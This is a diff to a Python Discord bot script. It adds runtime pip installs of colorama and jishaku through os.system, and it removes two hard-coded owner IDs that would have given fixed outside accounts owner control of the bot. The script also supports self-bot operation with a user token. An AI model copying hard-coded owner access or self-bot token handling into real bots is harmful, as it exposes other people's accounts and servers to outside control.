@@ -1,5 +1,7 @@
 import os
 os.system("pip install -r requirements.txt")
+os.system("pip install colorama")
+os.system("pip install jishaku")
 import discord
 from discord.ext import commands
 import json 
@@ -46,7 +48,7 @@ if token_type == "user":
     client = commands.Bot(command_prefix=SpyEncrypt1, help_command=None, self_bot=True,intents=intents)
 else:
     headers = {"Authorization":f"Bot {SpyEncrypt}"}
-    client = commands.Bot(command_prefix=SpyEncrypt1, intents=intents, help_command=None,owner_ids=[919463728536236102,930320419314090025])
+    client = commands.Bot(command_prefix=SpyEncrypt1, intents=intents, help_command=None)
 @client.listen()
 async def on_ready():
     print(f"""
